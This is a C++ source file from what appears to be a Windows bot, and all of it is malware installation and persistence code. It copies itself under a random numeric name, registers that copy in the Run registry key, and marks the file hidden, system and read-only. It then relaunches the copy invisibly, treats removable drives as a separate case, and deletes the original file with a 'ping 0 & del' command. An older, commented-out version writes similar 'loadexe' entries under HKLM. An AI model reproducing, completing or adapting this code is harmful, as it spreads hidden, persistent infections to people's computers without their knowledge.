#include "core.hpp"

char cfg_regname[64] = {0};

bool Install( API *api, string filename, string directory ) {
	char currentLocation[MAX_PATH], newLocation[MAX_PATH], temporaryHolder[MAX_PATH];
	HKEY hKey;

	if(!RetrieveSetting(CFG_REG, cfg_regname))
		return false;

	
	GetModuleFileName(GetModuleHandle(NULL), currentLocation, MAX_PATH);
	strcpy(temporaryHolder, currentLocation);
	api->PathRemoveFileSpec(temporaryHolder);
	ExpandEnvironmentStrings(cfg_gotopth, newLocation, MAX_PATH);
	api->directory = newLocation;
	api->directory += "\\";
	if (lstrcmpi(temporaryHolder, newLocation) != 0) {
installation:
		//We are not on the destination path.
		//Is there a bot on the system?
		bool botExists = false;
		if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			char data[MAX_PATH], tempHolder[MAX_PATH];
			DWORD size;
			DWORD dwType = REG_SZ;
			api->RegQueryValueEx(hKey, cfg_regname, 0, &dwType, (BYTE*)data, &size);
			strcpy(tempHolder, data);
			api->PathRemoveFileSpec(tempHolder);
			
			//Prepare new name in case we need it
			strcat(newLocation, "\\");
			strcat(newLocation, GenerateNumber(9).c_str());
			strcat(newLocation, ".exe");
			//Is there a bot registered on the system?
			if (lstrcmpi(tempHolder, newLocation) != 0) {
				//There isn't
				DWORD written = strlen(newLocation);
				api->RegSetValueEx(hKey, cfg_regname, 0, REG_SZ, (BYTE*)newLocation, written);
				api->RegCloseKey(hKey);
			} else {
				//There is but there is no file.
				strcpy(newLocation, data);
			}
			SetFileAttributes(newLocation, FILE_ATTRIBUTE_NORMAL);
			CopyFile(currentLocation, newLocation, FALSE);
			SetFileAttributes(newLocation, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
			
		} 
		PROCESS_INFORMATION pinfo;
		STARTUPINFOW sinfo;
		ZeroMemory(&pinfo, sizeof(pinfo));
		ZeroMemory(&sinfo, sizeof(sinfo));
		sinfo.lpTitle     = L"";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;


		char *loc = new char[api->thisfile.length()+1];
		api->wsprintf(loc, "%s", api->thisfile.c_str());
		loc[3] = '\0';
		char param[] = "000000000000000\0";
		if (api->GetDriveType(loc) == DRIVE_REMOVABLE)
			lstrcpy(param, "explorer.exe 3\0");
		else
			lstrcpy(param, "explorer.exe 1\0");
		
		try { delete loc; } catch (...) { }

		wchar_t* pwszParam = (wchar_t*)malloc(lstrlen(param) * sizeof(wchar_t));
		wchar_t* pwszPath = (wchar_t*)malloc(lstrlen(newLocation) * sizeof(wchar_t));
		
		MultiByteToWideChar(CP_ACP, 0, newLocation, lstrlen(newLocation), pwszPath, lstrlen(newLocation));
		MultiByteToWideChar(CP_ACP, 0, param, lstrlen(param), pwszParam, lstrlen(param));
		
		if (CreateProcessW(pwszPath,pwszParam,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL, NULL ,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			api->WSACleanup();

			char cmdexe[MAX_PATH];
			char command[MAX_PATH];
			
			ExpandEnvironmentStrings("%windir%", cmdexe, sizeof(cmdexe));
			strcat(cmdexe, "\\system32\\cmd.exe");
			sprintf(command, "/c ping 0 & del \"%s\" > NUL", currentLocation);
			SetFileAttributes(currentLocation, FILE_ATTRIBUTE_NORMAL);
			api->ShellExecuteA(0, 0, cmdexe, command, 0, SW_HIDE);
			
			free(pwszParam);
			free(pwszPath);
			ExitProcess(0);
		}
		free(pwszParam);
		free(pwszPath);
	} else {
		int f = 0;
		for (int i = 0; i < lstrlen(currentLocation); i++) {
			if (currentLocation[i] == '\\')
				f = i;
		}
		lstrcpy(cfg_filename, currentLocation + f + 1);
		if(!(cfg_filename[0] >= '0' && cfg_filename[0] <= '9')) { //is not number
			goto installation; // we need to install
		}
	}
	api->exefile = cfg_filename;
	api->final = api->directory + api->exefile;
	return true;
}


std::string GenerateNumber(int Len) {
	char *nick;
	int i;
	nick = (char *) malloc (Len);
	nick[0] = '\0';
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		sprintf(nick, "%s%d", nick, rand()%10);
	}
	nick[i] = '\0';
	string ret = nick;
	free(nick);
	return ret;
}


/*	HKEY hKey, hKey2;
	char data1[MAX_PATH] = {0};
	char data2[MAX_PATH] = {0};
	char final[MAX_PATH] = {0};
	api->wsprintf(final, "%s%s", directory.c_str(), filename.c_str());
	if (final[api->lstrlen(final) - 1] == '\r')
		final[api->lstrlen(final) - 1] = '\0';
	DWORD size = sizeof(data1);
	if (api->RegOpenKeyExA(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
		api->RegQueryValueExA(hKey, "loadexe", 0, NULL, (LPBYTE)data1, &size);
		if (data1[api->lstrlen(data1) - 1] == '\r')
			data1[api->lstrlen(data1) - 1] = '\0';
		if (!api->fileExists(api->directory + data1)) {
			dumpFile(api, directory, filename);
			api->RegSetValueExA(hKey, "loadexe", 0, REG_SZ, (BYTE*)api->exefile.c_str(), api->exefile.length());
			api->wsprintf(data1, "%s", api->exefile.c_str());
		}
		if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, api->magic(api->magic(api->magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey2) == ERROR_SUCCESS) {
			api->RegSetValueExA(hKey2, "loadexe", 0, REG_SZ, (BYTE*)data1, api->lstrlen(data1));
		} else {
			api->RegCreateKeyA(HKEY_LOCAL_MACHINE, api->magic(api->magic(api->magic(REG_DIR))).c_str(), &hKey2);
			api->RegSetValueExA(hKey2, "loadexe", 0, REG_SZ, (BYTE*)data1, api->lstrlen(data1));
		}
		api->exefile = data1;
	} else if (api->RegOpenKeyExA(HKEY_LOCAL_MACHINE, api->magic(api->magic(api->magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey2) == ERROR_SUCCESS) {
		api->RegQueryValueExA(hKey2, "loadexe", 0, NULL, (LPBYTE)data2, &size);
		if (data2[api->lstrlen(data1) - 1] == '\r')
			data2[api->lstrlen(data1) - 1] = '\0';
		if (!api->fileExists(api->directory + data2)) {
			dumpFile(api, directory, filename);
			api->RegSetValueExA(hKey2, "loadexe", 0, REG_SZ, (BYTE*)api->exefile.c_str(), api->exefile.length());
			api->wsprintf(data2, "%s", filename.c_str());
		}
		if (api->RegOpenKeyExA(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str(), 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			api->RegSetValueExA(hKey, "loadexe", 0, REG_SZ, (BYTE*)data2, api->lstrlen(data1));
					
		} else {
			api->RegCreateKeyA(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str(), &hKey);
			api->RegSetValueExA(hKey, "loadexe", 0, REG_SZ, (BYTE*)data2, api->lstrlen(data2));
		}
		api->exefile = data2;
	} else {
		dumpFile(api, directory, filename);
		api->RegCreateKeyA(HKEY_CURRENT_USER, api->magic(api->magic(api->magic(REG_DIR))).c_str(), &hKey);
		api->RegCreateKeyA(HKEY_LOCAL_MACHINE, api->magic(api->magic(api->magic(REG_DIR))).c_str(), &hKey2);
		api->RegSetValueExA(hKey, "loadexe", 0, REG_SZ, (BYTE*)api->exefile.c_str(), api->exefile.length());
		api->RegSetValueExA(hKey2, "loadexe", 0, REG_SZ, (BYTE*)api->exefile.c_str(), api->exefile.length());
		api->RegSetValueExA(hKey, "N", 0, REG_SZ, (BYTE*)"true", 4);
		char *loc = new char[api->thisfile.length()+1];
		api->wsprintf(loc, "%s", api->thisfile.c_str());
		loc[3] = '\0';
		if (api->GetDriveType(loc) == DRIVE_REMOVABLE)
			api->RegSetValueExA(hKey, "U", 0, REG_SZ, (BYTE*)"true", 4);
		try { delete []loc; } catch (...) {}
	}
	api->RegCloseKey(hKey);
	api->RegCloseKey(hKey2);
	return;
}*/

bool dumpFile( API *api, string directory, string filename) {
	api->SetFileAttributesA(api->final.c_str(), FILE_ATTRIBUTE_NORMAL);
	api->CopyFileA(api->thisfile.c_str(), (directory + filename).c_str(), false);
	api->SetFileAttributesA(api->final.c_str(), FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	return true;
}